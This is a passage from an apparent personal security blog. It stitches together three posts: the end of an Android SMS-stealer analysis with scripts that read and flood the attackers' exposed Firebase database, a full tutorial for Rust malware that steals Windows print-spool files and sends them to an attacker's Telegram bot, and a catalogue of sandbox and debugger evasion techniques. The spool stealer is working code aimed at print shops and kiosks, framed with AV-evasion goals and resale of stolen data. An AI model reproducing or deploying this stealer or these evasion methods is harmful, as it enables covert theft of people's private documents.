SSL pinning is a security technique where an app will only accept specific SSL certificates, rejecting all others—even those that would normally be trusted by the device. Legitimate apps use this to prevent man-in-the-middle attacks, but malware uses it to prevent traffic analysis. Bypassing SSL pinning was necessary to observe the malware's communications.

### The SMS Trigger
The breakthrough came when I simulated receiving an SMS:

![sms](https://i.ibb.co/Rp271Qk0/a.png)

Immediately after, the app began making network requests to a Firebase Realtime Database. I intercepted them using Burp Suite:

![firebase](https://i.ibb.co/svLfFBHH/burp.png)

## Identifying the Backend

### Firebase RTDB Discovery
The intercepted requests revealed an exposed Firebase Realtime Database URL. Using a JavaScript script, I queried the database:

\`\`\`javascript
const fetch = require('node-fetch'); 

const url = 'https://exposed-default-rtdb.firebaseio.com/.json';

fetch(url)
  .then(res => res.json())
  .then(data => {
    console.log("Full Firebase DB:", data);
  })
  .catch(err => {
    console.error("Error fetching full DB:", err);
  });
\`\`\`

This revealed thousands of user records containing stolen SMS messages , Contact numbers , screen shot links etc:

![data](https://i.ibb.co/wZbrjdvC/data.png)

### Testing Database Permissions
I attempted to delete data (which was fortunately blocked):

\`\`\`javascript
fetch(url, {
  method: 'DELETE',
  headers: { 'Content-Type': 'application/json' }
})
.then(response => console.log('Delete response:', response.status))
.catch(error => console.error('Error:', error));
\`\`\`

However, I discovered write access was enabled, allowing me to insert data:

\`\`\`javascript
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    "phone": "TEST_SECURITY_ALERT",
    "message": "YOUR_DATABASE_IS_EXPOSED",
    "timestamp": new Date().toISOString()
  })
})
.then(response => console.log('Write response:', response.status))
.catch(error => console.error('Error:', error));
\`\`\`

### Disrupting the Operation
To mitigate the impact, I wrote a script to insert junk data into the database :

> **Note** : The actual script was meant to insert fake picture links, rickroll videos, fake texts, and more, but I’ve only shown SMS insertion here.
\`\`\`javascript
const fetch = require('node-fetch');
const { faker } = require('@faker-js/faker');
const url = 'https://exposed-default-rtdb.firebaseio.com/.json';
(async () => {
  console.log("Inserting junk data...");
  for (let i = 1; i <= 5; i++) {
    const data = {
      info: \`Operator : mobinet, Number : \${faker.phone.number('+91##########')}\`,
      message: faker.lorem.sentences(2),
      sender: faker.company.name(),
      time: faker.date.past().toISOString()};
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)});
      if (res.ok) {
        console.log(\`Inserted \${i}:\`, data);
      } else {
        console.error(\`Failed \${i}: HTTP \${res.status}\`);}
    } catch (e) {
      console.error(\`Error \${i}:\`, e.message);}}
  console.log("Done!");})();
\`\`\`

Output of the junk data insertion:

![inject](https://i.ibb.co/JRBpsDq1/inject.png)

## Conclusion

This malware represents a sophisticated SMS harvesting operation using multiple advanced techniques:
- Multi-stage infection with a stager approach
- Heavy code obfuscation
- Root detection to evade analysis
- SSL pinning to protect network communications
- Trigger-based exfiltration (only activating when SMS is received)
- Anti-uninstallation mechanisms

The exposed Firebase RTDB instance containing thousands of records indicates this was an active and successful campaign affecting many users.

While the malware is capable of much more, I’ve chosen to omit those capabilities in this blog to keep it understandable and focused.
### Protective Measures


- **Avoid installing apps** from unknown sources or links received in messages.  
- **Most government agencies** will **never send APK files** directly or ask you to install apps outside the **Google Play Store or Apple App Store**.  
- **Verify official communications** through legitimate government websites or hotlines.  
- **Review app permissions** carefully before granting access to your data or device functions.  
- **Use trusted mobile security solutions** that can detect and block malicious applications.  
- **Stay alert** to unexpected messages demanding fines, fees, or personal information—these are often scams.

*Note: This post is intended for educational purposes. All discovered vulnerabilities were responsibly reported, and no actual user data was manipulated or exposed.*`,wf=`
# Hacking Printers - Intercepting Print Jobs with Rust Malware

>  Disclaimer: I am not claiming to have committed any of the acts described below. This is purely a demonstration meant to prove that your data is not safe anywhere.
>  This guide is for **educational and research purposes only**. Do **not** use this information for unauthorized monitoring. This is just a to prove that your data is not safe anywhere

## Introduction

Printing might seem like a simple user action, but under the hood, it kicks off a multi-step process involving rendering engines, spoolers, drivers, and hardware. In this post, we'll explore how **printing works on Windows**, where you can **intercept raw print data**, and how a **Rust-based malware** can capture \`.SPL\` files and exfiltrate them via Telegram.


---



This simulation mirrors a **real-world attack scenario**—such as targeting **Xerox shops, printing kiosks, or public computer labs**, where users send sensitive documents (passports, bank forms, contracts) to print. An attacker could **infect the system with malware** to silently grab these print jobs and exfiltrate them.

This kind of attack is stealthy, low-noise, and highly effective—especially in environments where **multiple people trust a single shared printer**.

Later these data can be sold on black market for hundreds of bitcoins 

---

##  Malware Goals

The malware in this demo is designed to:
-  **Bypass Modern Defenses**: Designed to run on the latest Windows builds with fully updated Windows Defender and common antivirus solutions without triggering alerts.
-  **Achieve Stealth**: Operates quietly in the background by only monitoring system spool activity.
-  **Avoid User-Space Hooks**: Doesn't tamper with visible application-level processes (e.g., browsers).
-  **Access High-Value Data**: Captures sensitive documents in raw \`.SPL\` form.
-  **Evade Detection**: Uses Rust for low AV signature overlap and minimal reverse engineering footprint.
- **Exfiltrate Efficiently**: Sends captured files via Telegram for simplicity (real-world actors may use stealthier C2 channels).
-  **Target Trusted Environments**: Exploits shared systems where multiple users trust a single endpoint (e.g., public printing stations).
-  **Minimize Forensic Evidence**: Avoids persistent artifacts and only interacts with volatile spool data.

---

##  Why Rust?

Before we dive into the code, it’s important to understand **why Rust was chosen** over more common languages like C or Go:

- **Memory Safety Without Garbage Collection**: Reduces risk of crashes or detection.
- **Smaller Binary Size than Go**: Go binaries are often large and more easily flagged.
- **Low Detection Surface**: Rust executables are often harder to reverse engineer.

- **A Rare Breed**: Many AV/EDR engines are tuned for malware written in C/C++, .NET, PowerShell, or Python.
---

##  Scope of This Demo

To keep the blog short and focused, we’ll **only implement the core logic**:
- Monitoring the print spool folder
- Capturing \`.SPL\` files
- Exfiltrating them via Telegram

We will **not cover**:
- Persistence mechanisms (e.g., registry keys, scheduled tasks)
- Privilege escalation or UAC bypass
- AV evasion or sandbox detection

These will be covered in future posts or linked via external resources.
---

## How Printing Works in Windows (Step-by-Step)

When a user hits "Print" in an application like Chrome, the following happens:

1. **Document Rendering**: The app prepares the content in a printable format—PDF, EMF (Enhanced Metafile), or RAW data.
2. **Spooling**: Windows passes the print job to the **Print Spooler (\`spoolsv.exe\`)**, which queues and stores it in:
   \`\`\`
   C:\\Windows\\System32\\spool\\PRINTERS
   \`\`\`
   Here, \`.SPL\` files contain the actual print data, and \`.SHD\` files contain job metadata (owner, settings).
3. **Driver Processing**: The printer driver converts the job to a format the printer understands (e.g., PCL or PostScript).
4. **Output**: The job is sent to the physical or virtual printer for final output.

---

##  Why Target Print Spoolers

We target the Windows Print Spooler for a few compelling reasons:

- **Centralized Job Handling**: The spooler queues all print jobs, making it a one-stop source to intercept user-generated content from any application.
- **High-Value Data**: Print jobs often contain sensitive or confidential data like contracts, invoices, ID documents, or internal reports.
- **System-Level Access**: The spool folder (\`C:\\Windows\\System32\\spool\\PRINTERS\`) is protected, so malware that reaches this location already has elevated privileges, allowing deeper system compromise.
- **Stealth**: Monitoring print queues is less likely to trigger antivirus alerts compared to injecting into browsers or stealing clipboard contents.

By targeting the **spool folder**, malware avoids hooking user-space APIs or manipulating visible interfaces.

---

##  What is a \`.SPL\` File?

An \`.SPL\` (Spool) file contains the **raw rendered data** of the document being printed. Depending on the printer driver and settings, it may contain EMF, PostScript, or other print-ready formats.

These files:
- Are temporarily stored in the spool folder.
- Are locked while the job is active.
- Can be read once the print job finishes or fails.

Intercepting \`.SPL\` files is like grabbing a snapshot of everything the user sends to their printer.

---

##  For Demo: Telegram as C2 (In Real Attacks, Other Methods Used)

This demonstration uses **Telegram's Bot API** to exfiltrate data because it is easy to set up and test.
However, real-world malware would use more **stealthy, encrypted, and resilient** Command and Control (C2) channels, such as:

- Self-hosted HTTP(S) servers
- Cloud services like Dropbox, Google Drive, or OneDrive
- DNS tunneling or covert channels

Telegram is used here for demonstration only.

---


##  Malware Target: The Spool Folder

If your goal is to **steal print job data**, the perfect interception point is:

\`\`\`
C:\\Windows\\System32\\spool\\PRINTERS
\`\`\`

At this location:
- \`.SPL\` files hold the raw data being printed.
- Files appear **immediately after a print job is spooled**, but are **locked** temporarily.

 **Important:** Accessing this folder requires **Administrator privileges**.

---

##  Malware in Action: Rust-Based \`.SPL\` Exfiltration Tool

This Rust malware performs the following malicious actions:
- **Watches the spool directory** for new print jobs.
- **Grabs \`.SPL\` files** once they are unlocked.
- **Sends them to an attacker-controlled Telegram bot**.

Let’s break it down:

---

###  Step 1: Configuration and Privilege Escalation Check

\`\`\`rust
const BOT_TOKEN: &str = "YOUR_BOT_TOKEN";
const CHAT_ID: &str = "YOUR_CHAT_ID";
const SPOOL_FOLDER: &str = r"C:\\Windows\\System32\\spool\\PRINTERS";

fn is_admin() -> bool {
    match std::fs::metadata(r"C:\\Windows\\System32\\config\\SAM") {
        Ok(_) => true,
        Err(_) => false,
    }
}
\`\`\`

- Malware checks if it's running with Administrator privileges.
- Hardcoded credentials are used to exfiltrate data via Telegram.

---

###  Step 2: File Exfiltration Logic

\`\`\`rust
async fn send_file_to_telegram(file_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let filename = file_path.file_name().and_then(|n| n.to_str()).unwrap_or("unknown.spl");
    println!("[+] New SPL file detected: {}", filename);

    sleep(Duration::from_secs(1)).await;

    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let form = multipart::Form::new()
        .text("chat_id", CHAT_ID.to_string())
        .text("caption", format!("🖨️ New SPL file: {}", filename))
        .part("document", multipart::Part::bytes(buffer).file_name(filename.to_string()));

    let url = format!("https://api.telegram.org/bot{}/sendDocument", BOT_TOKEN);
    let client = reqwest::Client::new();
    let response = client.post(&url).multipart(form).send().await?;

    if response.status().is_success() {
        println!("    ↳ '{}' sent to Telegram successfully.", filename);
    } else {
        let status = response.status();
        let text = response.text().await?;
        return Err(format!("Telegram API error {}: {}", status, text).into());
    }

    Ok(())
}
\`\`\`

- Waits briefly for \`.SPL\` file to be unlocked.
- Reads the contents into memory.
- Uses Telegram's Bot API to send the print job to an external attacker.

---

###  Step 3: File Monitoring and Triggering the Payload

\`\`\`rust
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    if !is_admin() {
        eprintln!("[!] Please run as Administrator (Elevated privileges required).");
        std::process::exit(1);
    }

    let spool_path = Path::new(SPOOL_FOLDER);
    if !spool_path.exists() || !spool_path.is_dir() {
        eprintln!("[!] Cannot access spool folder: {}
    Check your permissions.", SPOOL_FOLDER);
        std::process::exit(1);
    }

    println!("[*] Monitoring spool directory:
    {}", SPOOL_FOLDER);
    println!("[*] Will forward new .SPL files to Telegram chat ID: {}
", CHAT_ID);

    let (tx, rx) = channel();
    let mut watcher = watcher(tx, Duration::from_millis(500))?;
    watcher.watch(spool_path, RecursiveMode::NonRecursive)?;

    println!("[*] File watcher started. Press Ctrl+C to stop...
");

    loop {
        match rx.recv() {
            Ok(event) => match event {
                DebouncedEvent::Create(path) | DebouncedEvent::Write(path) => {
                    if let Some(ext) = path.extension() {
                        if ext.to_string_lossy().to_lowercase() == "spl" {
                            if let Err(e) = send_file_to_telegram(&path).await {
                                let filename = path.file_name()
                                    .and_then(|name| name.to_str())
                                    .unwrap_or("unknown.spl");
                                eprintln!("    [!] Failed to upload '{}': {}", filename, e);
                            }
                        }
                    }
                }
                DebouncedEvent::Error(e, _) => {
                    eprintln!("[!] Watch error: {:?}", e);
                }
                _ => {}
            },
            Err(e) => {
                eprintln!("[!] Watch error: {:?}", e);
                break;
            }
        }
    }

    Ok(())
}
\`\`\`

- The malware uses a file system watcher to detect \`.SPL\` files.
- On creation or write events, it exfiltrates them in real time.

---

###  Dependencies (\`Cargo.toml\`)

\`\`\`toml
[package]
name = "spool_monitor"
version = "0.1.0"
edition = "2021"

[dependencies]
notify = "4.0"
reqwest = { version = "0.11", features = ["multipart"] }
tokio = { version = "1.0", features = ["full"] }
\`\`\`

---

## Here is the  Full code [github](https://github.com/arxhr007/Spool-stealer-malware-PoC)

---

## Execution of PoC


1. **Initiating a Print Job in Chrome**  
   A user prints a document from the browser, triggering spool file generation.
   ![img](https://i.ibb.co/ymQ5XZrr/Screenshot-23.png)

2. **Running the Malware**  
   The compiled Rust binary is launched via the command line with Administrator privileges.
   ![img](https://i.ibb.co/fYC1yhXk/Screenshot-2025-06-01-200409.png)

3. **Receiving the \`.SPL\` File on Telegram**  
   The \`.SPL\` file appears in the attacker’s Telegram bot chat, showing successful exfiltration.
   ![img](https://i.ibb.co/chmjVp73/Screenshot-2025-06-01-200505.png)

4. **Extracting the Document**  
   Using a tool like [SPLView](https://splview.software.informer.com/), the raw \`.SPL\` file is parsed to reconstruct the original printed document.
   ![img](https://i.ibb.co/7trWM2CM/Screenshot-2025-06-01-200552.png)

---


##  Analysis Summary

This is a **working Rust malware sample** that hijacks print jobs by:
- Exploiting the Windows spool mechanism.
- Leveraging cloud APIs (Telegram) to exfiltrate stolen data.

---


##  Persistent and Evasion Techniques (Real-World Considerations)

Real-world malware often implements persistence mechanisms to survive reboots and maintain access:
- **Registry Run Keys**: Adding entries under \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`.
- **Scheduled Tasks**: Creating a scheduled task that executes the malware at logon.
- **Service Installation**: Installing itself as a Windows service to automatically start with the OS.
- **WMI Event Subscription**: Using WMI to trigger execution when specific system events occur.

To avoid antivirus (AV) detection, malware might employ:
- **Process Injection**: Injecting malicious code into legitimate processes (e.g., \`svchost.exe\`) to hide behavior.
- **Reflective DLL Injection**: Loading a DLL directly into memory without touching disk.
- **Code Obfuscation**: Encrypting or obfuscating strings and code segments.
- **Polymorphic/Metamorphic Techniques**: Dynamically changing the code structure to evade signature-based detection.
- **Living off the Land**: Using legitimate system tools (e.g., PowerShell, WMI) to perform malicious actions.

---

---

##  Persistence and Evasion: resources

Real-world malware uses a combination of **persistence** and **evasion** to survive and avoid detection.

For further exploration of persistence and AV evasion techniques, check out:

- [LOLBAS Project – Living Off the Land Binaries](https://lolbas-project.github.io/)
- [Awesome Malware Persistence](github.com/Karneades/awesome-malware-persistence)
- [Malware Persistence via WMI](https://attack.mitre.org/techniques/T1546/003/)


- [Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
- [Scheduled Tasks](https://attack.mitre.org/techniques/T1053/005/)
- [Windows Services](https://attack.mitre.org/techniques/T1543/003/)

- [Process Injection](https://attack.mitre.org/techniques/T1055/)
- [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [Code Obfuscation](https://any.run/cybersecurity-blog/6-common-obfuscation-methods-in-malware/)
- [Polymorphic Malware](https://medium.com/@RocketMeUpCybersecurity/polymorphic-malware-understanding-evasive-attack-strategies-6e1708780a56)

---
> I have already covered malware sandbox evasion tactics in this blog [link](https://www.arxhr007.me/blog/Sandbox-Evasion)
---

##  Privilege Escalation in the Real World 

>  This demo assumes the malware is run as Administrator. This is unrealistic without privilege escalation.

In real-world attacks, malware needs to **bypass User Account Control (UAC)** or perform **privilege escalation** via:

- **UAC Bypass Techniques**: Hijacking auto-elevated processes or abusing system binaries.
- **Token Stealing**: Impersonating or duplicating a privileged token.
- **Exploits**: Using known local privilege escalation (LPE) vulnerabilities.
- **Social Engineering**: Tricking the user into approving elevation.

Resources:
- [UACMe – Windows UAC bypass techniques](https://github.com/hfiref0x/UACME)
- [Privilege Escalation Techniques – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation)

---

##  More Accurate SPL File Access Info

An \`.SPL\` (Spool) file contains **raw print data** but is:
- **Locked** during printing.
- **Deleted** after printing, depending on the driver and OS settings.

>  Accessibility varies. Files may be readable after the print job **completes or fails**, but not always. Some drivers delete \`.SPL\` files immediately after printing.

Tools like [SPLView](https://splview.software.informer.com/) can parse and reconstruct contents from \`.SPL\` files.

---




##  Disclaimer
This blog post is meant purely for **educational and research** purposes.
Unauthorized use of the techniques described may violate local laws.

Always conduct experiments in isolated environments and with permission.

Stay informed. Stay safe.

---

 Follow me on [GitHub](https://github.com/arxhr007) for code, chaos, and cool projects.
 Connect with me on [LinkedIn](https://www.linkedin.com/in/aaron-thomas-parakkal/) because pretending to be an adult is hard.

### Happy Hacking !`,xf=`# Introduction

The cybersecurity landscape features an ongoing battle between security researchers using sandboxed environments to analyze malicious code and malware developers implementing sophisticated detection and evasion mechanisms. This technical guide explores the specific methods malware employs to identify analysis environments and the countermeasures it uses to evade detection.

> The information, scripts, or instructions provided are for educational purposes only.

> Knowledge of OS internals and Low-Level programming will help you grasp these concepts more effectively.
> To maintain technical accuracy, I’ve used terminology that might be challenging for non-tech-savvy readers—apologies! 
> If any part seems unclear, you can copy and paste it into ChatGPT for a simplified breakdown.

**You can find the code and details in this repo: [Malware-Sandbox-Evasion](https://github.com/arxhr007/Malware-Sandbox-Evasion/).**

I have attached a C [program](https://github.com/arxhr007/Malware-Sandbox-Evasion/blob/main/sandbox_detector.c) that demonstrates the practical implementation of some of the techniques listed below.

## Compilation Instructions :
\`\`\`
$ gcc -o sandbox_detector.exe sandbox_detector.c -lws2_32 -liphlpapi
$ .\\sandbox_detector.exe
\`\`\` 

Additionally, [\`\`\`sandbox_detector.exe\`\`\`](https://github.com/arxhr007/Malware-Sandbox-Evasion/raw/refs/heads/main/sandbox_detector.exe) is provided if you want to run it directly without compiling.

> I feel the need to clarify that I am not a professional—far from it. I'll be making plenty of mistakes as I’m still new to this, and I don’t claim that my code is the best, the most efficient, or that I’ve invented any of these techniques. 

---

# Runtime Environment Detection Techniques

### Virtual Processor Anomalies

Malware conducts CPU-level detection through multiple techniques:

- **CPUID instruction analysis**: Examining vendor strings (e.g., "VMwareVMware") and hypervisor-specific bits (bit 31 in ECX) via the \`cpuid\` instruction
- **Timing discrepancies**: Using \`rdtsc\` to measure execution time of virtualization-sensitive operations and comparing against expected thresholds
- **Instruction set inconsistencies**: Testing specialized instruction sets (AVX, SSE) for emulation artifacts and missing features
- **Red Pill technique**: Executing the \`sidt\` instruction to locate the Interrupt Descriptor Table, which differs in location between host and guest systems
- **Control register examination**: Reading CR0, CR3, and CR4 registers for virtualization flags and unexpected bits

Advanced malware implementations typically chain multiple CPU detection methods for higher reliability.

### API Hooking Detection

Sandbox monitoring relies on function interception, which malware aims to identify:

- **Function prologue verification**: Examining the first 5-7 bytes of critical Windows API functions for JMP or CALL instructions indicating hooks
- **In-memory checksum validation**: Computing hash values of memory-resident code and comparing with expected values
- **Call stack analysis**: Using functions like \`StackWalk64\` to inspect return addresses for non-standard module entries
- **Shadow API verification**: Testing secondary entry points (e.g., Nt* vs. Zw* functions) for inconsistent behavior
- **IAT/EAT examination**: Analyzing import and export address tables in PE headers for modifications indicating hooks

Once hooks are detected, evasive malware can employ alternative code paths or attempt hook removal.

### Execution Environment Analysis

Process context provides valuable indicators of analysis environments:

- **Process path examination**: Using \`GetModuleFileName\` to check execution directories for analysis-related paths
- **Command line inspection**: Accessing \`GetCommandLine\` or PEB structures to identify debugging flags
- **Parent process verification**: Using \`NtQueryInformationProcess\` with \`ProcessBasicInformation\` to verify the parent PID
- **Module load analysis**: Enumerating loaded DLLs via \`EnumProcessModules\` to detect debugging/analysis libraries
- **Memory scanning**: Searching process memory space for analysis tool strings and signatures
- **Thread enumeration**: Using \`Thread32First/Next\` to verify thread counts and identify monitoring threads

These checks are often performed early in execution to enable immediate termination if analysis is detected.

### Debugging Detection Techniques

Sophisticated malware employs multiple debugger detection methods:

- **Trap flag testing**: Setting and monitoring the processor trap flag (TF) in the EFLAGS register
- **Debug register inspection**: Checking DR0-DR7 registers for breakpoint addresses using assembly-level access
- **Exception handling manipulation**: Setting custom exception handlers via \`SetUnhandledExceptionFilter\` to detect debugger presence
- **Timing analysis**: Measuring execution time of instructions like \`int 2d\` that behave differently under debugging
- **Self-modifying code**: Implementing runtime code modification that confuses debugger instruction caches
- **Anti-stepping measures**: Using TLS callbacks or thread-based monitors to detect single-step execution

These techniques specifically target interactive analysis rather than automated sandbox execution.

## System Environment Analysis

### Operating System Artifacts

The host OS contains numerous virtualization indicators:

- **Registry fingerprinting**: Examining keys like \`HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\` for virtual disk identifiers
- **Device driver inspection**: Identifying drivers like vmci.sys, vboxdrv.sys using \`EnumDeviceDrivers\`
- **System file analysis**: Checking for files associated with VirtualBox, VMware, or analysis tools
- **Service enumeration**: Using \`EnumServicesStatusEx\` to detect VM-related services
- **Process identification**: Searching for processes like vmtoolsd.exe or VBoxService.exe
- **Windows Management Instrumentation queries**: Executing WMI queries for system information using \`IWbemServices\`
- **Event log examination**: Analyzing Windows event logs for sandbox creation indicators

OS-level detection can identify not just virtualization but specific analysis platforms by their unique signatures.

### Hardware Configuration Assessment

Virtual hardware presents detectable differences from physical systems:

- **Device fingerprinting**: Examining hardware device IDs and characteristics via \`SetupDiGetClassDevs\`
- **Serial number analysis**: Checking BIOS, motherboard, and disk serial numbers for default values
- **BIOS/UEFI examination**: Inspecting firmware data using \`GetSystemFirmwareTable\` for virtualization indicators
- **Hardware performance testing**: Measuring GPU, disk, and CPU performance against expected metrics
- **Hardware variety assessment**: Verifying the presence of diverse peripherals found on real systems
- **USB controller analysis**: Checking USB controller types and attached device history
- **Accelerated graphics assessment**: Testing for genuine GPU capabilities using DirectX or OpenGL calls

Hardware configuration analysis reveals sandbox environments that fail to simulate complete physical systems.

### Storage System Analysis

Disk configurations frequently expose analysis environments:

- **Disk size verification**: Using \`GetDiskFreeSpaceEx\` to identify suspiciously small disk capacities
- **Partition structure examination**: Analyzing disk layouts with \`DeviceIoControl\` calls for virtualization patterns
- **Storage performance measurement**: Testing I/O performance through sequential and random access patterns
- **Disk identifier inspection**: Looking for VDI, VMDK, or QCOW signatures using low-level disk access
- **Disk activity history**: Examining NTFS USN journal and file timestamps for usage patterns
- **Volume shadow copy analysis**: Checking for the presence of VSS data with \`VSSAdmin\`
- **Disk manufacturer information**: Verifying hardware information against known virtual providers using SMART data

Storage analysis identifies recently created or purpose-built analysis environments lacking realistic usage patterns.

### Memory System Analysis

RAM configuration provides strong virtualization indicators:

- **Memory size validation**: Checking \`GlobalMemoryStatusEx\` results for restricted memory allocations
- **Memory address space layout**: Analyzing memory organization via VirtualQuery for virtualization patterns
- **Memory performance testing**: Measuring access times and throughput with calibrated test routines
- **Memory allocation behavior**: Testing allocation patterns and limits using large allocation requests
- **TLB (Translation Lookaside Buffer) testing**: Verifying CPU cache behaviors through timing tests
- **NUMA (Non-Uniform Memory Access) inspection**: Using \`GetNumaHighestNodeNumber\` to check for expected NUMA configurations
- **Memory timing consistency**: Measuring variations in memory access times across regions

Memory testing reveals simplified environments configured with minimal resources for analysis.

## User Environment Detection

### Human Interaction Analysis

Real systems demonstrate human usage patterns:

- **Input device monitoring**: Using \`GetLastInputInfo\` and \`GetCursorPos\` to detect mouse and keyboard activity
- **Input pattern analysis**: Analyzing input timing patterns to distinguish human from automated input
- **Idle time assessment**: Measuring system idle periods using \`GetTickCount\` versus active usage patterns
- **Focus changes**: Monitoring application focus with \`GetForegroundWindow\` for realistic transitions
- **Clipboard content examination**: Using \`GetClipboardData\` to check for presence of clipboard content
- **Screen resolution changes**: Monitoring for user-initiated display configuration changes with \`EnumDisplaySettings\`
- **Multi-monitor detection**: Verifying support for multiple displays using \`EnumDisplayDevices\`

User interaction analysis reveals automated analysis environments lacking simulated user behavior.

### User Data Assessment

User profiles in legitimate systems contain accumulated personal content:

- **Document analysis**: Enumerating files in user document directories for history and variety
- **Media file verification**: Checking for photos, videos, and music collections in standard locations
- **Browser data examination**: Analyzing browser databases for history, cookies, and cached content
- **Email client data**: Verifying presence of email stores and configuration files
- **Application preferences**: Checking for personalized settings in application configuration files
- **Recent file history**: Examining recently accessed file lists in the registry and jump lists
- **Download history**: Analyzing browser download history and saved attachment patterns

User data checks rapidly identify newly created analysis environments lacking realistic user artifacts.

### System Usage Patterns

Long-term system usage creates distinctive patterns:

- **Application usage history**: Examining application prefetch files and user activity logs
- **System uptime analysis**: Checking boot history and uptime durations via \`GetTickCount64\` and event logs
- **Power event verification**: Analyzing hibernation, sleep/wake cycles in power management logs
- **Update history examination**: Checking Windows Update history for consistent patching patterns
- **Login history assessment**: Verifying user login patterns in security event logs
- **Temporary file accumulation**: Checking temp directories for accumulated files
- **Log file growth**: Examining log files for organic growth patterns rather than minimal entries

Usage pattern analysis effectively identifies purpose-built analysis environments lacking historical usage.

## Network Environment Analysis

### Connectivity Assessment

Network configuration reveals sandboxed environments:

- **DNS resolution testing**: Verifying legitimate DNS resolution using \`DnsQuery\` or \`getaddrinfo\`
- **Proxy detection**: Identifying monitoring proxies using \`WinHttpGetIEProxyConfigForCurrentUser\`
- **Network isolation testing**: Attempting connections to determine containment using ICMP or TCP tests
- **Bandwidth measurement**: Testing network throughput against expected baseline values
- **Latency analysis**: Measuring response times to external resources for anomalies
- **MTU verification**: Checking for non-standard MTU settings using \`GetAdaptersAddresses\`
- **Network stack fingerprinting**: Analyzing TCP/IP stack behavior for virtualization artifacts

Connectivity testing identifies contained environments with restricted or simulated external access.

### Interface Configuration Analysis

Network adapter settings expose virtualization:

- **MAC address validation**: Checking for MAC ranges (00:0C:29, 00:50:56, 08:00:27) associated with VM providers
- **Interface naming patterns**: Looking for virtualization-specific interface names via \`GetAdaptersInfo\`
- **IP assignment verification**: Analyzing IP address allocation patterns for sandbox ranges
- **Network adapter types**: Identifying virtual adapter models through WMI queries
- **Adapter performance testing**: Measuring throughput versus expected specifications
- **Network driver examination**: Checking for virtualization-specific drivers via \`EnumDeviceDrivers\`
- **Promiscuous mode detection**: Testing for monitoring configurations using packet injection tests

Interface analysis identifies standard virtual environments with default network configurations.

### External Network Characteristics

Internet-facing configurations can reveal sandbox implementations:

- **IP reputation checking**: Verifying if external IP is associated with security companies via external services
- **Geolocation verification**: Ensuring geographic location matches expected target area using IP geolocation
- **ASN (Autonomous System Number) validation**: Checking if traffic originates from security or cloud providers
- **Connection throttling detection**: Testing for artificial bandwidth limitations with throughput tests
- **Traffic inspection identification**: Detecting DPI or SSL interception through certificate validation
- **UDP behavior analysis**: Testing UDP connectivity which may be blocked in restrictive sandboxes
- **DNS sinkholes detection**: Checking for artificial DNS responses by comparing multiple resolution methods

External network tests identify sandboxes with limited, monitored, or simulated internet access.

## Advanced Evasion Techniques

### Temporal Evasion Strategies

Timing-based methods enable malware to outlast analysis windows:

- **Multi-stage sleep chains**: Implementing nested \`Sleep\`, \`WaitForSingleObject\`, or \`timeSetEvent\` calls
- **External event monitoring**: Waiting for system reboots, user logins, or specific system events
- **Distributed timing verification**: Using multiple timing sources like \`QueryPerformanceCounter\` and NTP
- **Time zone monitoring**: Tracking time zone consistency and changes via \`GetTimeZoneInformation\`
- **NTP verification**: Comparing system time against network time protocol servers with socket APIs
- **Timer object manipulation**: Using Windows timer objects with complex triggering conditions
- **Event-based triggering**: Activating only after specific system events occur, monitored via event hooks

Temporal evasion remains highly effective against automated analysis systems with runtime limitations.

### Code Flow Obfuscation

Complex execution paths impede both static and dynamic analysis:

- **Dead code injection**: Adding massive amounts of never-executed code to confuse analysis
- **Opaque predicates**: Creating conditions that always resolve one way but appear variable to static analysis
- **Control flow flattening**: Rearranging code into switch-case structures with state variables
- **State machine implementation**: Converting linear code into state-based execution patterns
- **Exception-based flow**: Using structured exception handling to create unusual flow paths
- **Thread synchronization complexity**: Creating interdependent execution threads with complex signaling
- **Indirect jumps and calls**: Using computed addresses for control flow transfers via function pointers

Flow obfuscation significantly increases analysis complexity and required resources.

### Custom Implementation of System APIs

Bypassing monitored functions prevents hook-based analysis:

- **Direct syscall implementation**: Using raw SYSCALL/SYSENTER instructions with manually built structures
- **Custom DLL loading**: Implementing manual library loading using \`NtMapViewOfSection\` to avoid monitored paths
- **Inline assembly alternatives**: Recreating API functionality with low-level assembly code
- **Alternative API routes**: Using uncommon Native API alternatives for common operations
- **Dynamic API resolution**: Resolving function addresses at runtime through hashing or CRC-based lookups
- **Stolen code execution**: Executing copies of system code in malware memory space to avoid hooks
- **Anti-API-hook guard pages**: Implementing memory protection via \`VirtualProtect\` to prevent hook installation

Custom API implementation effectively bypasses most hook-based monitoring systems.

### Environment Manipulation

Actively modifying the analysis environment creates confusion:

- **Self-modifying configuration**: Altering system settings to interfere with analysis tools
- **Registry key manipulation**: Creating, modifying, or deleting registry keys to disrupt monitoring
- **File system pollution**: Generating large volumes of decoy files to complicate analysis
- **Process hollowing and injection**: Using techniques like \`CreateRemoteThread\` or \`SetThreadContext\` to disperse code
- **API hooking reversal**: Implementing hook detection and removal mechanisms
- **DLL search order manipulation**: Exploiting load order to substitute malicious components
- **Selective component activation**: Enabling functionality only when specific environmental conditions are met

Environment manipulation actively works to disable or confuse analysis tools.

### Detecting Isolation with External Triggers

Verification through external systems defeats isolated analysis:

- **Command and control verification**: Requiring specific responses from C2 infrastructure
- **Domain generation algorithms (DGAs)**: Creating unique domain patterns that sandboxes can't predict
- **Multi-channel communications**: Requiring responses across different protocols (HTTP, DNS, ICMP)
- **Distributed configuration storage**: Splitting configuration across multiple external sources
- **Cloud service API interaction**: Leveraging legitimate cloud services like AWS or Azure for verification
- **Blockchain-based verification**: Using cryptocurrency transaction data as triggers
- **Timing-based network fingerprinting**: Measuring response patterns from known services

External verification effectively defeats isolated sandboxes without comprehensive internet simulation.

## Counter-Counter-Evasion Techniques

### Developing Resilient Analysis Environments

Modern sandbox development focuses on detection avoidance:

- **Hardware virtualization masking**: Modifying hypervisor code to remove detectable artifacts
- **Full system simulation**: Using complete hardware emulation rather than virtualization
